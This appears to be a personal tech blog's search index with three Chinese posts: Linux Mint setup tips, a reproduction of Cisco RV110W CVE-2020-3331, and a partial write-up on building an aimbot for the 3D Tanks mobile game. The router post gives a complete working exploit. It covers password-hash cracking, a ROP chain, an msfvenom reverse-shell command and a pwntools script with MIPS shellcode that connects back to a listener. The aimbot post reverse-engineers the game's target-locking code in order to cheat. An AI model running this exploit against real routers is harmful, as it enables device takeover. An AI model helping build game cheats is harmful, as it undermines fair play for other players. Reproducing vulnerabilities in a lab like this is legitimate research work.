<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Linux Mint - Linux 主系统 + Windows 虚拟机双系统方案踩坑</title>
    <url>/2024/06/01/Linux-Mint-Zephyrus/</url>
    <content><![CDATA[<h3 id="For-what"><a href="#For-what" class="headerlink" title="For what"></a>For what</h3><p>先说一下为什么我要用 Linux 当主系统。因为最近需要编译一些项目，vm 的性能实在是有点拉了。考虑到以后一直有这方面的需求，干脆决定装一个 Linux 主机 + Windows 虚拟机的工作环境</p>
<p>然后是为什么要用 Linux Mint 这个系统，而不是 Ubuntu、Kali、Deepin 啥的。原因很简单，我一个一个试的，试了很多发行版(除了 Deepin 没试)。这些系统无一例外都有一些奇怪的 bug，比如 Ubuntu 的死机，我不信邪还装了两次，结果就是用着用着桌面就会卡死，没有任何征兆; Kali 的双屏适配有问题，GPU 驱动适配不了，装着试了但是效果不行，还把图形界面搞炸了。总之最后机缘巧合之下想起来初中的时候用过这个 Linux Mint，然后装着试下了，用着居然还不错。</p>
<p>我的机子是幻16 2022款，显卡是3060，除了没有 RGB 所有硬件都工作正常</p>
<h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>简单介绍一下 Linux Mint 这个系统，它是基于 Ubuntu 改的，算是简约派但是该有的基本都有</p>
<p>桌面用的是他们自己开发的 cinnamon。任务栏上面允许放置小插件(温度监控之类的)，QQ 小图标也可以正常地显示在任务栏中。但是这个桌面有个大槽点是，它开始菜单里左侧可以固定一些快捷应用，但是当你右键这些应用图标，它并不会显示出设置(取消固定之类的)，而是必须在列表里翻到原本的那个应用图标，然后右键才能取消固定。桌面图标有时候会错位，其实问题不大全选拖一下就行了。但是它还有个最严重的问题是，有时候会突然寄掉，然后自己会恢复。虽然它寄掉不会影响正在跑的东西，但是突然出现还是让人心头一紧。寄的原因尚不清楚，可能是爆内存了。开发人员或许知道这个桌面也有美中不足的地方，于是很贴心地在任务栏右键中给了一个疑难解答 debug 模式，可以快速重启桌面。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/mint_taskbar.png.avif"
                     
                ></p>
<p>它自带有软件商店，支持 SystemPackage 和 Flathub，使用体验还是不错的，图片和评论功能都有</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/mint_install.png.avif"
                     
                ></p>
<h3 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h3><h4 id="Fcitx-5-输入法"><a href="#Fcitx-5-输入法" class="headerlink" title="Fcitx 5 输入法"></a>Fcitx 5 输入法</h4><p>中文输入法要自己装，我用的是 Fcitx5，但是这玩意儿在双屏上有 bug，它可能会获取不到屏幕的 DPI 大小，从而显示出错，打个字出来的候选界面能把占个屏幕占完</p>
<p><a class="link"   href="https://github.com/fcitx/fcitx5/issues/642" >https://github.com/fcitx/fcitx5/issues/642 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>解决方案：更改 <code>~/.config/fcitx5/conf/classicui.conf</code>，设置 <code>PerScreenDPI=False</code></p>
<h4 id="N-卡驱动"><a href="#N-卡驱动" class="headerlink" title="N 卡驱动"></a>N 卡驱动</h4><p>你说得对，但是这个系统专门有个页面管理 N 卡驱动，可以在设置里进去</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/mint_gpu.png.avif"
                     
                ></p>
<p>驱动直接装上，一点毛病没有，浏览器都能调用，甚至任务栏小图标还给个显卡图标，可以调模式。但是建议不要调，亲测调成 Intel 节能模式后图形界面启动不了，就用 Nvidia 性能模式就行了</p>
<p><del>但是比较难受的是，笔记本屏幕怎么搞都只能 60 帧，外接屏能 165 帧没问题。没有外接屏又想装这个系统的要多考虑下了。</del></p>
<p>更正：更新内核到6.x即可解决显示器帧率问题，GPU模式依旧不建议调，双屏会出现 DPI bug</p>
<h4 id="QQ-登录"><a href="#QQ-登录" class="headerlink" title="QQ 登录"></a>QQ 登录</h4><p>每次重启系统，QQ 都会给识别成新设备，这个是 QQ 的问题不是系统的问题。QQ 会采集一些指纹来标识机子，比如网卡啥的，在 Linux 下有些东西不像 Windows 那样一成不变，很明显他们搞的采集点有问题，解决方案暂时没有。</p>
<h4 id="CPU-调度"><a href="#CPU-调度" class="headerlink" title="CPU 调度"></a>CPU 调度</h4><p>在 Linux 下没有奥创中心，CPU 模式调不了，调度疑似是比较激进的，因为风扇经常吹，开个博客网页风扇都一直吹，这点在 Windows 下从未出现过</p>
<p>可能有人会说直接 <code>/sys/devices</code> 设置啊，Linux 下万物皆可调，但是当我 <code>cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor</code>，出来的居然是 “powersave”？？然后我读了下 <code>scaling_driver</code> 这个文件内容是 “intel_pstate”，搜了下原来是一种新的调度技术，它这个 powersave 模式就是兼顾省电和性能的模式。</p>
<p>但是风扇为什么一直吹呢？我研究了一下，发现居然是 Intel 大小核的问题，计算任务基本上全分给大核了，小核的使用率曲线就如同平静的河面一般毫无波澜。</p>
<p>执行 <code>uname -a</code> 回显为</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linux Zephyrus 5.15.0-107-generic #117-Ubuntu SMP Fri Apr 26 12:26:49 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure></div>

<p>一开始我以为是这个内核没有针对大小核进行优化，就升级了内核到 6.x，结果歪打正着解决了显示器帧率问题。并且我搜到 Linux Mint 的<a class="link"   href="https://forums.linuxmint.com/viewtopic.php?t=420077" >论坛 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>居然有个人和我问一模一样的问题，电脑配置都和我一样</p>
<p>然后升级了内核，CPU 温度还是高，于是又继续研究，最终找到了解决方案</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Disable CPU frequence turbo</span></span><br><span class="line"><span class="built_in">echo</span> 1&gt;/sys/devices/system/cpu/intel_pstate/no_turbo</span><br><span class="line"></span><br><span class="line"><span class="comment"># List available CPU power preferences </span></span><br><span class="line"><span class="built_in">cat</span> policy0/energy_performance_available_preferences </span><br><span class="line"><span class="comment"># default performance balance_performance balance_power power </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set CPU power config from &quot;balance_performance&quot; to &quot;balance_power&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;balance_power&quot;</span>|<span class="built_in">tee</span> /sys/devices/system/cpu/cpufreq/policy*/energy_performance_preference</span><br></pre></td></tr></table></figure></div>

<p>这样修改后，CPU 已经基本能压到六十多度，风扇再转基本就是 GPU 驱动的问题了</p>
<h4 id="科学上网"><a href="#科学上网" class="headerlink" title="科学上网"></a>科学上网</h4><p>科学上网我选择使用 <a class="link"   href="https://github.com/v2rayA/v2rayA" >v2raya <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，使用 web 页面进行管理</p>
<h4 id="Windows-虚拟机"><a href="#Windows-虚拟机" class="headerlink" title="Windows 虚拟机"></a>Windows 虚拟机</h4><p>一开始用的 Virt-manager，这玩意儿性能不错，但是分辨率不能随意调整，鼠标还是卡，有些细节还是不太行，就换成 VirtualBox 了，使用体验非常好</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Windows</tag>
        <tag>TroubleShooting</tag>
      </tags>
  </entry>
  <entry>
    <title>Cisco RV110W 路由器 CVE-2020-3331 漏洞复现</title>
    <url>/2024/03/11/RV110W-CVE-2020-3331/</url>
    <content><![CDATA[<p>某天发现实验室里有这个路由器，是学长留下的，那这不日日都说不过去了吧</p>
<p>参考：</p>
<p><a class="link"   href="https://xuanxuanblingbling.github.io/iot/2020/10/26/rv110w/" >思科路由器 RV110W CVE-2020-3331 漏洞复现 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h3><p>首先可以拿到该设备的固件，解包固件可以找到 <code>/etc/shadow</code> 里面存的 admin 用户的密码 hash</p>
<p><code>/sbin/rc</code> :</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/RV110W_rc.png.avif"
                     
                ></p>
<p>使用 hashcat 可以对该 hash 进行爆破，需要事先准备一份弱密码字典，最后爆出来 密码是 <code>Admin123</code> 。有了密码，就能直接通过 telnet 远程连上路由，这样有 shell 比较方便复现漏洞</p>
<p>搜索 <code>login.cgi</code> 路由，以确定 web 服务器程序是哪一个</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">grep -rn <span class="string">&quot;login.cgi&quot;</span> * 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 递归搜索关键字，并将stderr重定向到null</span></span><br><span class="line"><span class="comment"># &#x27;*&#x27; 表示搜索所有文件</span></span><br><span class="line"><span class="comment"># r 表示递归，n 表示显示行号</span></span><br></pre></td></tr></table></figure></div>

<p>最终确定是 <code>/sbin/httpd</code></p>
<p>分析 <code>/sbin/httpd</code> 程序中的 <code>guest_logout_cgi()</code> ，发现危险函数 <code>sscanf()</code></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">v5 = (<span class="type">const</span> <span class="type">char</span> *)get_cgi(<span class="string">&quot;cmac&quot;</span>);</span><br><span class="line">v7 = get_cgi(<span class="string">&quot;cip&quot;</span>);</span><br><span class="line">v6 = (<span class="type">const</span> <span class="type">char</span> *)get_cgi(<span class="string">&quot;cip&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> ( j = (<span class="type">char</span> *)(v7 + <span class="built_in">strlen</span>(v6) - <span class="number">1</span>); get_cgi(<span class="string">&quot;cip&quot;</span>) &lt; (<span class="type">unsigned</span> <span class="type">int</span>)j; *j-- = <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v9 = *j;</span><br><span class="line">  <span class="keyword">if</span> ( v9 != <span class="number">10</span> &amp;&amp; v9 != <span class="number">13</span> &amp;&amp; v9 != <span class="number">32</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">v10 = (<span class="type">const</span> <span class="type">char</span> *)get_cgi(<span class="string">&quot;cip&quot;</span>);</span><br><span class="line">v11 = (<span class="type">const</span> <span class="type">char</span> *)get_cgi(<span class="string">&quot;submit_button&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !v11 )</span><br><span class="line">  v11 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> ( v5 &amp;&amp; v10 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(v29, <span class="number">0</span>, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v28, <span class="number">0</span>, <span class="keyword">sizeof</span>(v28));</span><br><span class="line">  v12 = fopen(<span class="string">&quot;/dev/console&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  v13 = v12;</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(v12, <span class="string">&quot;\n  mac=[%s], ip=[%s], submit_button=[%s]\n&quot;</span>, v5, v10, v11);</span><br><span class="line">    fclose(v13);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( VERIFY_MAC_17(v5) &amp;&amp; VERIFY_IPv4(v10) ) <span class="comment">//MAC 和 IP 有效</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(v11, <span class="string">&quot;status_guestnet.asp&quot;</span>) ) <span class="comment">//submit_button 包含 status_guestnet.asp</span></span><br><span class="line">      <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">    <span class="built_in">sscanf</span>(v11, <span class="string">&quot;%[^;];%*[^=]=%[^\n]&quot;</span>, v29, v28);  </span><br></pre></td></tr></table></figure></div>

<p>这个 <code>sscanf</code> 是在从<code>v11</code>正则匹配存到 <code>v29</code> <code>v28</code> ，存在栈溢出漏洞</p>
<p>匹配规则：<code>%</code>表示要，<code>%*</code>表示不要</p>
<ul>
<li><code>%[^;]</code> 分号前面的所有字符都要，存在 <code>v29</code></li>
<li><code>;%*[^=]</code> 分号后等号前所有的东西都不要</li>
<li><code>=%[^\n]</code> 等号后所有东西都要，存在 <code>v28</code></li>
</ul>
<p>比如 <code>aaa;bbb=ccc</code> 就是<code>aaa</code>和<code>ccc</code>被提取出</p>
<p>其实这个匹配不重要，此时 v11 就是 <code>submit_button=</code> 后面的值</p>
<p>故分析程序路径要到达这个 sscanf 得有三个参数且满足对应的要求：</p>
<ol>
<li>cmac：MAC 地址格式</li>
<li>cip：IP 地址格式</li>
<li>submit_button: 包含 status_guestnet.asp</li>
</ol>
<p>我们可以传输超长的 submit_button 项来测试是否会溢出，另外两个 cmac 和 cip 都有格式检测，唯有 submit_button 只需要包含字符串 <code>status_guest.asp</code> 即可</p>
<p>可以写一个 python 脚本来发包看看：</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://192.168.1.1/guest_logout.cgi&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,<span class="string">&quot;submit_button&quot;</span>:<span class="string">&quot;status_guestnet.asp&quot;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span>,<span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.1.100&quot;</span>&#125;</span><br><span class="line"><span class="comment">#requests.get(url, data=payload, verify=False, timeout=1)</span></span><br><span class="line">requests.post(url, data=payload, verify=<span class="literal">False</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>

<p>post 上去之后，web 页面就无法访问了，为了得到更多的细节，我们可以传一个 gdbserver 上去远程调试</p>
<p><a class="link"   href="https://gitee.com/h4lo1/HatLab_Tools_Library/tree/master/%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F/gdbserver" >https://gitee.com/h4lo1/HatLab_Tools_Library&#x2F;tree&#x2F;master&#x2F;静态编译调试程序&#x2F;gdbserver <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">./gdbserver --attach 0.0.0.0:1234 515 <span class="comment"># httpd pid</span></span><br></pre></td></tr></table></figure></div>

<p>经过调试，执行到 <code>sscanf</code> 时，v29 会匹配到 <code>submit_button</code> 的值，如果后面不加更多参数的话 v28 什么都匹配不到</p>
<p>v29 正好是该函数栈最底端的数据，紧接 fp 和 pc，那么覆盖 pc 将非常容易</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/RV110W_stack.png.avif"
                     
                ></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; distance 0x7fcc839c 0x7fcc8404</span><br><span class="line">0x7fcc839c-&gt;0x7fcc8404 is 0x68 bytes (0x1a words)</span><br><span class="line"><span class="comment"># len(&quot;status_guestnet.asp&quot;) == 19</span></span><br><span class="line"><span class="comment"># 0x68-19 = 85</span></span><br></pre></td></tr></table></figure></div>

<p>所以填充长度为85</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&quot;status_guestnet.asp&quot;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">85</span>+p32(pc)</span><br></pre></td></tr></table></figure></div>

<p>mips 没有 nx ，所以可以 shellcode in stack</p>
<p>如下图，函数退出时，这些寄存器都可以自由控制</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/RV110W_ida.png.avif"
                     
                ></p>
<p>首先得找到合适的 gadget, 把栈地址给寄存器，然后再跳到寄存器</p>
<p>不能使用程序本身的 gadget，因为程序的地址有<code>\x00</code> ，发过去就截断了，所以考虑使用 libc</p>
<p>经过调试发现 libc 的地址是固定的，并没有随机化，固定为 0x2af98000，可以在 libc 中查找 gadget</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># stackfind 表示查找给寄存器赋栈地址值的 gadget,同时使用 move $t9 过滤跳转寄存器指令</span></span><br><span class="line">ROPgadget --binary libc.so --mipsrop <span class="string">&quot;stackfinder&quot;</span>|grep <span class="string">&#x27;move $t9&#x27;</span></span><br><span class="line"><span class="comment">#0x002CBFC # la      $a0, _stdio_openlist_add_lock ; move    $t9, $s1 ; jalr    $t9 ; addiu   $a0, $sp, 0x28</span></span><br><span class="line"><span class="comment"># 该 gadget 将 sp+0x28 赋给a0，然后跳转到 s1,注意这里向前提了一条是防止地址有\x00</span></span><br><span class="line">ROPgadget --binary libc.so |grep <span class="string">&#x27;move $t9, $a0&#x27;</span></span><br><span class="line"><span class="comment">#0x0003d050 : move $t9, $a0 ; sw $v0, 0x18($sp) ; jalr $t9 ; addiu $a0, $sp, 0x18</span></span><br><span class="line"><span class="comment"># 跳转到栈地址</span></span><br></pre></td></tr></table></figure></div>

<p>至于控制各寄存器的栈偏移位置可以用 <code>cyclic()</code> <code>cyclic_find()</code>测算</p>
<p>shellcode 的功能是反弹shell，所以开一个端口进行监听，shellcode 可以用<a class="link"   href="http://shell-storm.org/shellcode/files/shellcode-860.php" >这个 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，也可以用 msf 生成，我选择用 msf</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/mipsle/shell_reverse_tcp  LHOST=10.10.10.100 LPORT=31337 --<span class="built_in">arch</span> mipsle --platform linux -f py -o shellcode.py</span><br></pre></td></tr></table></figure></div>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> thread,requests</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io     = listen(<span class="number">31337</span>)</span><br><span class="line">libc   = <span class="number">0x2af98000</span></span><br><span class="line"></span><br><span class="line">jmp_s0 = libc + <span class="number">0x002CBFC</span> <span class="comment"># la      $a0, _stdio_openlist_add_lock ; move    $t9, $s1 ; jalr    $t9 ; addiu   $a0, $sp, 0x28</span></span><br><span class="line">jmp_a0 = libc + <span class="number">0x0003D050</span> <span class="comment"># move $t9, $a0 ; sw $v0, 0x18($sp) ; jalr $t9</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xf8\xff\xa5\xaf\x0a\x64\x05\x3c\x0a\x0a\xa5\x34\xfc\xff\xa5\xaf&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xab\x0f\x02\x24\x0c\x09\x09\x01&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># offset for s0: 49</span></span><br><span class="line"><span class="comment">#s1: 53</span></span><br><span class="line"><span class="comment">#s2: 57</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;status_guestnet.asp&quot;</span> +<span class="string">b&#x27;a&#x27;</span>*<span class="number">49</span>+p32(jmp_a0)+<span class="number">32</span>*<span class="string">b&#x27;a&#x27;</span>+p32(jmp_s0)+<span class="number">0x28</span>*<span class="string">b&#x27;a&#x27;</span>+shellcode</span><br><span class="line"><span class="comment">#payload += cyclic(100)</span></span><br><span class="line">paramsPost = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,<span class="string">&quot;submit_button&quot;</span>:payload,<span class="string">&quot;cip&quot;</span>:<span class="string">&quot;10.10.10.100&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    <span class="keyword">try</span>: requests.post(<span class="string">&quot;https://10.10.10.1/guest_logout.cgi&quot;</span>, data=paramsPost, verify=<span class="literal">False</span>,timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>: <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">thread.Thread(attack,()).run()</span><br><span class="line">io.wait_for_connection()</span><br><span class="line">log.success(<span class="string">&quot;getshell&quot;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># reg 0x0431B58</span></span><br><span class="line"><span class="comment">#0x431bb0</span></span><br></pre></td></tr></table></figure></div>

<p><a class="link"   href="https://xuanxuanblingbling.github.io/iot/2020/10/26/rv110w/" >https://xuanxuanblingbling.github.io/iot/2020/10/26/rv110w/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>其实我贴的这个文章中有一个错误，其选择的 libc gadget 0x000257A0 有一个指令为</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sw     $v0, 0x18($sp)</span><br></pre></td></tr></table></figure></div>

<p>而 <code>$sp+0x18</code> 正好是他写 shellcode 的地方，此时 v0 为 0，这个指令会让 shellcode 第一条指令<br><code>slti $a0, $zero, 0xFFFF</code> 变成 <code>nop</code>，导致第一个 syscall：close(stdin) 实际上没有正常执行</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>路由器， Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>3D 坦克手游自瞄挂开发</title>
    <url>/2024/04/10/TOHack/</url>
    <content><![CDATA[<p>3D 坦克是一个多人在线游戏，玩家操作自己的坦克进行杀敌、拔旗、站点等活动，整个游戏偏科幻类型</p>
<p>某日突然发现其手游的客户端居然没有任何防护，故心血来潮就想试试能不能做出大名鼎鼎的自瞄挂，过程比较曲折，但是结果却有惊喜。</p>
<h3 id="前置信息介绍"><a href="#前置信息介绍" class="headerlink" title="前置信息介绍"></a>前置信息介绍</h3><p>在该游戏中，所谓的自瞄指的是长时间瞄准类炮塔的锁定功能，而不是仿真坦克游戏那种摆角度。比如有个炮叫火箭炮，在瞄准锁定敌人一定时间后，它可以发射出一长串追踪火箭，伤害非常可观。但是其瞄准锁定的过程往往会因为敌人的走位或者队友的阻挡被中断。其具体效果可以查看<a class="link"   href="https://www.bilibili.com/video/BV1Zs411E7h7/?share_source=copy_web&vd_source=f225f0bc3ad1daf1caa03ae6fde71bfe&t=186" >该视频 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>3分6秒处。</p>
<p>为了打破这个限制，曾经国外有很多大佬开发过自瞄挂，使该炮的瞄准不会中断，瞄一下就能稳定地发射出火箭。</p>
<h3 id="寻找关键函数"><a href="#寻找关键函数" class="headerlink" title="寻找关键函数"></a>寻找关键函数</h3><p>因为是 Android 端所以理所当然地使用 Frida 和 Xposed 这两个工具。Frida 进行 debug，然后移植到 Xposed。</p>
<p>进入游戏，先随便点点。可以很明显地看出来，这个游戏的界面用是 Android 控件，因为有那种很明显的Android 点击动画</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/tohack_store.webp"
                     
                ></p>
<p>使用布局查看工具也能证实这个猜想</p>
<p>布局查看工具：GKD <a class="link"   href="https://gkd.li/guide/" >https://gkd.li/guide/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>在该应用的高级模式中打开悬浮窗服务，手动保存当前游戏 Activity 快照</p>
<p>然后在 Web 端查看布局抓取结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/tohack_gkd.png.avif"
                     
                ></p>
<p>游戏战斗界面有瞄准 button，抓取得到其 id 为 <code>right_shot_button</code>，随后可以在 jadx 中搜索该关键词</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/tohack_jadx1.png.avif"
                     
                ></p>
<p>定位到相关代码后，进行简单交叉引用查找，可以发现很多调用都是在 alternativa 包里面。已知火箭炮的英文名为 Striker，jadx 中直接搜索，可以发现很多 alternativa 的用例，看来该包大概率是游戏逻辑处理部分</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/tohack_jadx_striker.png.avif"
                     
                ></p>
<p>最终也是经过一番翻找，发现相关的逻辑处理就在 <code>lockTarget</code> 函数中</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">alternativa.tanks.battle.weapons.types.striker.components;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span> <span class="comment">// alternativa.tanks.battle.weapons.aiming.AimingWeapon</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">lockTarget</span><span class="params">(<span class="meta">@NotNull</span> LockResult lockResult, <span class="meta">@Nullable</span> Long l)</span> &#123;</span><br><span class="line">        StrikerTargetingSystem strikerTargetingSystem;</span><br><span class="line">        Intrinsics.checkNotNullParameter(lockResult, <span class="string">&quot;lockResult&quot;</span>);</span><br><span class="line">        <span class="type">GunParamsCalculator</span> <span class="variable">gunParamsCalculator</span> <span class="operator">=</span> <span class="built_in">this</span>.gunParamsCalculator;</span><br><span class="line">        <span class="keyword">if</span> (gunParamsCalculator == <span class="literal">null</span>) &#123;</span><br><span class="line">            Intrinsics.throwUninitializedPropertyAccessException(<span class="string">&quot;gunParamsCalculator&quot;</span>);</span><br><span class="line">            gunParamsCalculator = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">GlobalGunParams</span> <span class="variable">laserParams</span> <span class="operator">=</span> gunParamsCalculator.getLaserParams();</span><br><span class="line">        <span class="type">StrikerTargetingSystem</span> <span class="variable">strikerTargetingSystem2</span> <span class="operator">=</span> <span class="built_in">this</span>.targetingSystem;</span><br><span class="line">        <span class="keyword">if</span> (strikerTargetingSystem2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            Intrinsics.throwUninitializedPropertyAccessException(<span class="string">&quot;targetingSystem&quot;</span>);</span><br><span class="line">            strikerTargetingSystem2 = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        strikerTargetingSystem2.setPreferredTarget(getPreferredTarget(l));</span><br><span class="line">        <span class="type">StrikerTargetingSystem</span> <span class="variable">strikerTargetingSystem3</span> <span class="operator">=</span> <span class="built_in">this</span>.targetingSystem;</span><br><span class="line">        <span class="keyword">if</span> (strikerTargetingSystem3 == <span class="literal">null</span>) &#123;</span><br><span class="line">            Intrinsics.throwUninitializedPropertyAccessException(<span 